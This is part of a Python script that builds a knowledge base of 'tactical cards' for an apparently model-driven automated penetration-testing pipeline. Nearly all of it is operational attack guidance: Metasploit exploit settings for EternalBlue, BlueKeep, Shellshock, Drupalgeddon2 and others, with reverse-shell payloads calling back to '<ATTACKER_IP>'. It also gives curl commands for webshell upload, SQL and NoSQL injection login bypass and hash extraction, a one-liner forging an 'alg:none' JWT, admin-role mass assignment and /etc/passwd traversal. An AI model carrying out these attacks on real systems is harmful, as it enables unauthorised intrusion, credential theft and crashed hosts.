        required_options='    "TARGETURI": "/"',
        why="""  WordPress core is rarely the bug; a PLUGIN/THEME is. Enumerate users/version
  with wordpress_login_enum / wordpress_scanner, identify the plugin, then pick
  its exploit via search (e.g. wp_file_manager_rce, wp_wpdiscuz_*). Set TARGETURI
  to the WP root; many WP exploits need a php payload.""",
    ))

    # =====================================================================
    # CONFIGURACAO DE PAYLOADS (por plataforma e staged vs stageless)
    # =====================================================================
    cards.append(format_tactical_card(
        name="payload_families_by_platform",
        keywords="payload platform linux windows php java python cmd meterpreter shell reverse bind",
        description="Pick the payload FAMILY that matches the exploit's platform/arch.",
        instructions="""
        The payload MUST match the exploit's platform/arch (check 'show payloads').
        Picking the wrong family -> "Invalid payload" or a shell that never runs.
          - Linux x64 exploit  -> linux/x64/meterpreter/reverse_tcp
                                   (fallback: linux/x64/shell_reverse_tcp)
          - Linux x86 exploit  -> linux/x86/meterpreter/reverse_tcp
          - Windows x64        -> windows/x64/meterpreter/reverse_tcp
          - Windows x86        -> windows/meterpreter/reverse_tcp
          - Command injection on Unix -> cmd/unix/reverse (or reverse_perl/reverse_bash)
          - PHP web RCE / eval -> php/meterpreter/reverse_tcp (fallback php/reverse_php)
          - Java app (RMI/JBoss/Tomcat/Jenkins) -> java/meterpreter/reverse_tcp
          - Python RCE         -> python/meterpreter/reverse_tcp
        All reverse_* payloads need "LHOST" (attacker) and "LPORT". bind_* and
        backdoor/interact payloads do NOT (omit LHOST/LPORT).
        """
    ))

    cards.append(format_tactical_card(
        name="staged_vs_stageless_and_encoding",
        keywords="staged stageless meterpreter shell inline encoding badchars reliability",
        description="Staged vs stageless payloads and when encoding matters.",
        instructions="""
        STAGED (meterpreter/reverse_tcp): small stub pulls the rest over the net.
        Powerful, but needs a stable connection and the handler up (the pipeline
        sets DisablePayloadHandler=false). If a staged payload connects then dies,
        try a STAGELESS/inline one:
          - *_reverse_tcp (meterpreter)  ->  shell_reverse_tcp / shell/reverse_tcp
          - php/meterpreter              ->  php/reverse_php (inline command shell)
        ENCODING/BADCHARS: command/php payloads rarely need encoding. If you see
        "All encoders failed to encode", the MODULE's BadChars are incompatible
        with that payload type - do NOT keep swapping payloads of the SAME family;
        switch to a cmd/generic payload or a different module (see
        encoder_failure_and_badchars).
        """
    ))

    # =====================================================================
    # RECEITAS WINDOWS (cobertura alem do Metasploitable2)
    # =====================================================================
    cards.append(attack_card(
        name="attack_guide_smb_eternalblue",
        ports="445", banner_match='Windows SMBv1 on 445',
        keywords="smb port 445 ms17-010 eternalblue windows cve-2017-0144 smbv1",
        strategy="exploit_cve",
        module="exploit/windows/smb/ms17_010_eternalblue",
        required_options='    "PAYLOAD": "windows/x64/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2017-0144. FIRST confirm with auxiliary/scanner/smb/smb_ms17_010
  (strategy enumeration). Only run EternalBlue if the scanner says VULNERABLE;
  on a patched/64-bit-mismatched host it can crash the target.""",
        if_missing="""  1. search ms17_010  (variants: _psexec, _command).
  2. If x86 target, use windows/meterpreter/reverse_tcp instead of x64.
  3. Else TIER C: searchsploit ms17-010.""",
    ))

    cards.append(attack_card(
        name="attack_guide_rdp_bluekeep",
        ports="3389", banner_match='RDP on 3389 (Windows 7 / 2008)',
        keywords="rdp port 3389 bluekeep cve-2019-0708 windows remote desktop",
        strategy="exploit_cve",
        module="exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        required_options='    "PAYLOAD": "windows/x64/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444", "TARGET": "3"',
        why="""  CVE-2019-0708. VERY unstable: wrong TARGET bluescreens the host. FIRST scan
  with auxiliary/scanner/rdp/cve_2019_0708_bluekeep (strategy enumeration).
  TARGET maps to the hypervisor (1=VMware, 2=Hyper-V, 3=Baremetal/other);
  start with 3 and, on failure, let the retry loop try other indexes.""",
    ))

    # =====================================================================
    # WEB: doutrina + receitas por APP (usam a sub-fase de enumeracao web)
    # =====================================================================
    cards.append(format_tactical_card(
        name="web_enumeration_doctrine",
        keywords="http https web apache nginx php javascript enumeration targeturi vhost path app",
        description="How to attack a web port: the banner is NOT the target; the app is.",
        instructions="""
        A web SERVER banner (Apache/nginx/IIS/PHP/Node) does NOT tell you what is
        vulnerable. The vulnerability lives in the APPLICATION behind a PATH.
        ALWAYS read the WEB ENUMERATION findings (http-enum/title/headers/methods)
        provided for the port and act on DISCOVERED paths/apps:
          - Map each discovered path to an app, then to a module (see web cards).
          - Set the EXACT path in "TARGETURI" (e.g. "TARGETURI": "/tikiwiki/").
          - Use "VHOST" if the app answers on a specific hostname.
          - PHP apps -> php/* payloads (e.g. php/meterpreter/reverse_tcp).
          - If headers show "DAV" or methods include PUT -> WebDAV upload (see card).
          - If headers show "X-Powered-By: PHP/5.x" served via CGI -> php_cgi card.
        If nothing exploitable is discovered, run auxiliary/scanner/http/dir_scanner
        (strategy enumeration) to find more paths, then re-evaluate.
        nginx itself rarely has RCE: focus on the app it proxies.
        """
    ))

    cards.append(attack_card(
        name="web_webdav_upload",
        ports="80, 443, 8080", banner_match='HTTP headers show "DAV"/"DAV/2" or PUT allowed',
        keywords="webdav dav put upload webshell apache /dav writable http",
        strategy="enumeration",
        module="auxiliary/scanner/http/webdav_scanner",
        required_options='    "PATH": "/"',
        why="""  WebDAV lets you WRITE files. First confirm with webdav_scanner. On
  Metasploitable2 the /dav/ folder is writable. There is no single MSF exploit:
  UPLOAD a webshell manually (TIER C) and browse to it.""",
        if_missing="""  TIER C (missing_module_manual_poc): upload and trigger a shell, e.g.
    curl -T shell.php http://<TARGET>/dav/shell.php
    curl 'http://<TARGET>/dav/shell.php?cmd=id'
  (use a simple PHP system($_GET[cmd]) shell).""",
        after_session="A webshell runs as www-data; then local privesc.",
    ))

    cards.append(attack_card(
        name="web_php_cgi_arg_injection",
        ports="80, 443", banner_match='HTTP header "X-Powered-By: PHP/5.x" (php-cgi)',
        keywords="php cgi argument injection cve-2012-1823 php5 x-powered-by rce",
        strategy="exploit_cve",
        module="exploit/multi/http/php_cgi_arg_injection",
        required_options='    "TARGETURI": "/", "PAYLOAD": "php/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2012-1823: PHP running as a CGI accepts command-line args in the query
  string -> RCE. The X-Powered-By: PHP/5.3.x/5.4.x header is the signal. PHP
  payload (set LHOST/LPORT).""",
    ))

    cards.append(attack_card(
        name="web_phpmyadmin",
        ports="80, 443, 8080", banner_match='http-enum found "/phpMyAdmin/" or "/phpmyadmin/"',
        keywords="phpmyadmin web sql rce lfi setup targeturi credentials",
        strategy="exploit_cve",
        module="exploit/multi/http/phpmyadmin_lfi_rce",
        required_options='    "TARGETURI": "/phpMyAdmin/", "USERNAME": "root", "PASSWORD": "", "PAYLOAD": "php/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  Set TARGETURI to the discovered path. phpMyAdmin exploits are VERSION-specific
  and usually need DB creds (try root/blank on Metasploitable2). If this exact
  module is missing, search for the right one.""",
        if_missing="""  1. search phpmyadmin   (pick the module matching the installed version)
  2. If only info disclosure, read config/version then switch module.
  3. TIER C: searchsploit phpmyadmin <version>.""",
    ))

    cards.append(attack_card(
        name="web_tikiwiki",
        ports="80, 443", banner_match='http-enum found "/tikiwiki/" or "/tiki/"',
        keywords="tikiwiki tiki web php rce graph formula targeturi metasploitable",
        strategy="exploit_cve",
        module="exploit/unix/webapp/tikiwiki_graph_formula_exec",
        required_options='    "TARGETURI": "/tikiwiki/", "PAYLOAD": "php/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  Old TikiWiki (on Metasploitable2) has a PHP code-eval RCE. Set TARGETURI to the
  discovered path. If the module name differs, search 'tikiwiki'.""",
    ))

    cards.append(attack_card(
        name="web_twiki",
        ports="80, 443", banner_match='http-enum found "/twiki/"',
        keywords="twiki web perl rce history rev targeturi cgi",
        strategy="exploit_cve",
        module="exploit/unix/webapp/twiki_history",
        required_options='    "TARGETURI": "/twiki/", "PAYLOAD": "cmd/unix/reverse", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  TWiki 'rev' parameter command injection. Set TARGETURI to the discovered path.
  If missing, search 'twiki'.""",
    ))

    cards.append(attack_card(
        name="web_struts2",
        ports="80, 443, 8080", banner_match='Java app / .action/.do URLs (Apache Struts)',
        keywords="struts struts2 ognl content-type java rce cve-2017-5638 targeturi",
        strategy="exploit_cve",
        module="exploit/multi/http/struts2_content_type_ognl",
        required_options='    "TARGETURI": "/<app>.action", "PAYLOAD": "linux/x64/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2017-5638 (OGNL via Content-Type). Set TARGETURI to a real .action/.do
  endpoint found in enumeration. Many Struts CVEs exist; search 'struts' and pick
  the one matching the version/vector.""",
    ))

    cards.append(attack_card(
        name="web_drupalgeddon2",
        ports="80, 443", banner_match='http-enum found "/user/register" or CHANGELOG Drupal',
        keywords="drupal drupalgeddon cve-2018-7600 php rce targeturi cms",
        strategy="exploit_cve",
        module="exploit/unix/webapp/drupal_drupalgeddon2",
        required_options='    "TARGETURI": "/", "PAYLOAD": "php/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2018-7600 (Drupal 7/8 unauth RCE). Set TARGETURI to the Drupal root path.""",
    ))

    cards.append(attack_card(
        name="web_shellshock_cgi",
        ports="80, 443", banner_match='http-enum found "/cgi-bin/" scripts (bash CGI)',
        keywords="shellshock bash cgi cve-2014-6271 apache mod_cgi env rce targeturi",
        strategy="exploit_cve",
        module="exploit/multi/http/apache_mod_cgi_bash_env_exec",
        required_options='    "TARGETURI": "/cgi-bin/<script>", "PAYLOAD": "linux/x64/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2014-6271 (Shellshock). TARGETURI must point at a REAL cgi script found in
  enumeration (e.g. /cgi-bin/status). A wrong TARGETURI fails silently.""",
    ))

    cards.append(attack_card(
        name="web_jenkins_script_console",
        ports="8080, 8081, 80", banner_match='http-title/headers show "Jenkins"',
        keywords="jenkins script console groovy rce java targeturi ci",
        strategy="exploit_cve",
        module="exploit/multi/http/jenkins_script_console",
        required_options='    "TARGETURI": "/", "PAYLOAD": "java/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  If the Groovy script console is unauthenticated (or creds known), this is RCE.
  Set TARGETURI to the Jenkins base path. Add "USERNAME"/"PASSWORD" if required.""",
    ))

    # =====================================================================
    # WEB LOGIC FLAWS (SPA + REST/JSON API; NO Metasploit module -> manual)
    # Doutrina GENERICA de exploracao web-logica para alvos modernos (Juice
    # Shop, DVWA-NG, bWAPP, APIs REST em geral). Estes bugs sao de LOGICA/
    # INJECAO na APLICACAO - nao ha modulo MSF: a estrategia e "manual" e o
    # TIER C (run_manual_exploit) autora curl/python3 contra a API. Exemplos
    # citam o OWASP Juice Shop, mas os PADROES valem para qualquer app web.
    # =====================================================================
    cards.append(format_tactical_card(
        name="web_logic_flaws_doctrine",
        keywords="web application logic flaw spa rest api json owasp manual curl juice shop dvwa bwapp sqli xss auth idor no metasploit module modern webapp",
        description="Modern web apps (SPA + REST/JSON API) have LOGIC/INJECTION bugs with NO Metasploit module -> strategy 'manual' (TIER C via curl/python3).",
        instructions="""
        WHEN THIS APPLIES (modern web app): a port serves HTTP(S) and WEB
        ENUMERATION shows a Single-Page App (Angular/React/Vue: near-empty
        index.html loading main*.js) and/or a JSON REST API (/rest/ /api/
        /graphql; JSON responses), with NO version-specific vulnerable CMS/
        product -> there is NO exploit_cve module.
        STRATEGY: return "manual" (module_name empty). The TIER C loop lets you
        author curl/python3 commands against the target's HTTP API.
        OWASP CLASS -> read the matching card:
          Injection SQL      -> web_sqli_injection
          Injection NoSQL    -> web_nosql_injection
          Broken auth / JWT  -> web_broken_auth_jwt
          Broken access ctl  -> web_access_control_idor
          XSS/SSTI/cmdi/LFI  -> web_xss_and_injection_misc
        WORK request/response (no reverse shell): enumerate first
          curl -s http://<TARGET>:<PORT>/ ; then probe /rest /api /api/v1
          /graphql /robots.txt ; send JSON with
          curl -s -H 'Content-Type: application/json' --data '{...}' <url> ;
          read the JSON and adapt the next command.
        success_check (the loop succeeds ONLY if this substring appears): pick a
        string seen only on success - an auth token key ("authentication"/
        "token"), a leaked admin email, a password hash, or a flag. Do NOT use
        "uid=" for web-logic; an admin token or dumped protected data IS success.
        """
    ))

    cards.append(format_tactical_card(
        name="web_sqli_injection",
        keywords="sql injection sqli auth bypass login union select or 1=1 error based curl rest api juice shop /rest/user/login",
        description="SQL injection: authentication bypass and data extraction via curl against a web login/search endpoint. STRATEGY manual.",
        instructions="""
        TRIGGER: a login form or a search/filter endpoint on a web app with no
        vulnerable-product CVE. STRATEGY (exact value): manual.
        STEP 1 - AUTH BYPASS (classic): inject into the username/email field so the
        WHERE clause is always true and the query is truncated with a comment.
          Payloads to try in the identifier field: ' OR 1=1--   ' OR '1'='1'--
          ' OR 1=1;--   admin'--   "' OR true--"  (SQLite/Juice Shop use: ' OR 1=1--)
          JSON login example (adapt field names from the real request):
            curl -s -H 'Content-Type: application/json' \\
              --data '{"email":"\\' OR 1=1--","password":"x"}' \\
              http://<TARGET>:<PORT>/rest/user/login
          SUCCESS: response returns an auth token -> success_check: "authentication"
          (or "token"). That token is a logged-in (often admin) session.
        STEP 2 - DATA EXTRACTION (UNION / error-based) on a search/GET param:
          curl -s "http://<TARGET>:<PORT>/rest/products/search?q=test')) UNION SELECT 1,email,password,4,5,6,7,8,9 FROM Users--"
          Adjust the number of columns until the error stops (error-based column count).
          SUCCESS: leaked emails/hashes in the JSON -> success_check: a leaked value
          like "@" (email) or a hash prefix.
        PITFALLS: URL-encode payloads in GET (%27 for ', %20 for space) or the shell/
        HTTP may mangle them; in JSON, escape the quote (\\'). Different DBs differ
        (SQLite vs MySQL vs Postgres): read the SQL ERROR echoed in the response and
        adapt (comment syntax --, #, /* */; string concat ||, CONCAT).
        """
    ))

    cards.append(format_tactical_card(
        name="web_nosql_injection",
        keywords="nosql injection mongodb operator injection $ne $gt $where json api auth bypass curl juice shop",
        description="NoSQL/operator injection in JSON APIs (MongoDB-style): auth bypass and blind extraction. STRATEGY manual.",
        instructions="""
        TRIGGER: a JSON API backed by a NoSQL/Mongo store (modern Node/Express apps).
        STRATEGY (exact value): manual.
        AUTH BYPASS via query OPERATORS in place of a string value:
          curl -s -H 'Content-Type: application/json' \\
            --data '{"email":{"$ne":null},"password":{"$ne":null}}' \\
            http://<TARGET>:<PORT>/rest/user/login
          Also try {"$gt":""} and {"$regex":".*"}. SUCCESS: a token is returned ->
          success_check: "token" / "authentication".
        OPERATOR INJECTION in update/query endpoints (e.g. mass-review, order):
          Inject {"$where":"...", "$gt":"", "$ne":""} to bypass filters or force
          server-side evaluation. Read the JSON error to learn the backend.
        BLIND: when no data is echoed, use a boolean/time operator and infer from the
        HTTP status or response length changing between true/false payloads.
        PITFALL: the field must be sent as a JSON OBJECT, not a string - keep
        Content-Type: application/json and do NOT quote the operator object.
        """
    ))

    cards.append(format_tactical_card(
        name="web_broken_auth_jwt",
        keywords="broken authentication jwt json web token alg none weak secret hmac password reset default creds oauth bearer curl juice shop",
        description="Broken authentication: forged/weak JWT, weak-secret cracking, password-reset abuse, default creds. STRATEGY manual.",
        instructions="""
        TRIGGER: the app issues a JWT/bearer token (login returns a token; requests
        carry 'Authorization: Bearer <jwt>'). STRATEGY (exact value): manual.
        INSPECT the token: a JWT is header.payload.signature, each base64url.
          echo '<jwt>' | cut -d. -f1 | base64 -d 2>/dev/null   # header -> read "alg"
          echo '<jwt>' | cut -d. -f2 | base64 -d 2>/dev/null   # payload -> user/role
        ATTACK A - alg:none: rebuild the token with header {"alg":"none","typ":"JWT"}
          and an elevated payload (e.g. "email":"admin@..."), empty signature:
            python3 -c "import base64,json; h=base64.urlsafe_b64encode(b'{\\"alg\\":\\"none\\",\\"typ\\":\\"JWT\\"}').rstrip(b'='); p=base64.urlsafe_b64encode(b'{\\"email\\":\\"admin@juice-sh.op\\"}').rstrip(b'='); print((h+b'.'+p+b'.').decode())"
          Send it: curl -s -H 'Authorization: Bearer <forged>' http://<TARGET>:<PORT>/rest/user/whoami
          SUCCESS: whoami/admin endpoint returns the elevated identity ->
          success_check: the admin email or "isAdmin":true.
        ATTACK B - weak HMAC secret: crack the signature offline
          (hashcat -m 16500, or jwt_tool) with a wordlist; if cracked, mint any token.
        ATTACK C - password reset / default creds: weak reset flows set a known
          password for a known account; also try admin@<domain>/admin, admin/admin
          and documented demo accounts before anything fancy.
        PITFALL: base64url (not standard base64): pad with '=' and translate -_ to +/
        when decoding.
        """
    ))

    cards.append(format_tactical_card(
        name="web_access_control_idor",
        keywords="broken access control idor bola forced browsing admin endpoint mass assignment privilege escalation role curl juice shop basket order",
        description="Broken access control: IDOR/BOLA, forced browsing to admin, and mass-assignment privilege escalation. STRATEGY manual.",
        instructions="""
        TRIGGER: endpoints that take an object id (/rest/basket/1, /api/users/5,
        /order/42) or an admin area. STRATEGY (exact value): manual.
        IDOR / BOLA - access another user's object by changing the id:
          Get YOUR token (log in / register), then request neighbours' ids:
            for i in 1 2 3 4 5; do curl -s -H 'Authorization: Bearer <jwt>' \\
              http://<TARGET>:<PORT>/rest/basket/$i; echo; done
          SUCCESS: you read data belonging to another user -> success_check: a value
          that is not yours (another user's email/product).
        FORCED BROWSING - hit admin/privileged paths directly:
          curl -s http://<TARGET>:<PORT>/rest/admin/application-version
          curl -s http://<TARGET>:<PORT>/#/administration   (SPA route; check the JS
          bundle main*.js for hidden routes: curl -s .../main.js | grep -oE '/[a-z-]+')
        MASS ASSIGNMENT / privilege escalation at registration - send extra fields the
        UI never exposes (role/isAdmin/deluxeToken):
          curl -s -H 'Content-Type: application/json' \\
            --data '{"email":"a@b.c","password":"Passw0rd!","role":"admin"}' \\
            http://<TARGET>:<PORT>/api/Users/
          SUCCESS: the created user has elevated role -> success_check: "admin".
        PITFALL: read the JS bundle and the 401/403 vs 200 responses - a 200 on an
        admin path with no auth, or a role you set sticking, confirms the flaw.
        """
    ))

    cards.append(format_tactical_card(
        name="web_xss_and_injection_misc",
        keywords="xss cross site scripting reflected stored dom ssti server side template command injection path traversal lfi xxe curl confirm web",
        description="XSS and other web injections (SSTI, command injection, path traversal/LFI, XXE): how to CONFIRM each via curl. STRATEGY manual.",
        instructions="""
        STRATEGY (exact value): manual. For each class, send a probe and CONFIRM from
        the response (no browser needed for confirmation).
        XSS (reflected/stored): send a unique marker payload and check it is reflected
          UNSANITIZED (tags intact, not HTML-encoded):
            curl -s "http://<TARGET>:<PORT>/rest/products/search?q=<script>alert(1)</script>" | grep -o '<script>alert(1)</script>'
          SUCCESS (reflected): the raw <script> tag appears in the response ->
          success_check: "<script>alert(1)". Stored XSS: POST the marker to a
          comment/review/name field, then GET the page that renders it and grep.
        SSTI (template injection): inject a math expression in a name/template field:
          probe {{7*7}} or ${7*7} or <%= 7*7 %>; SUCCESS if the response contains 49
          -> success_check: "49".
        COMMAND INJECTION: append shell metachars to a param that hits the OS:
          ;id   |id   `id`   $(id)   -> success_check: "uid=" in the response.
        PATH TRAVERSAL / LFI: read a known file via a file/download/path param:
          curl -s "http://<TARGET>:<PORT>/ftp/../etc/passwd" ; or ?file=../../../../etc/passwd
          (try ..%2f and %2500.md bypass) -> success_check: "root:x:0:0".
        XXE: if an endpoint accepts XML, send a DOCTYPE external entity reading a
          local file; SUCCESS if the file content is reflected.
        PITFALL: reflection that is HTML-ENCODED (&lt;script&gt;) is NOT exploitable
        XSS. Confirm against a benign request, do not assume.
        """
    ))

    # ---- salva ----
    output_path = os.getenv("TACTICAL_OUT", "/app/config/ingest/kb_tactical.txt")
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        f.write("\n".join(cards))

    print(f"[DB_03] [SUCESSO] Gerados {len(cards)} Cards Taticos.")
    print(f"[DB_03] [OUTPUT] {output_path}")


if __name__ == "__main__":
    main()
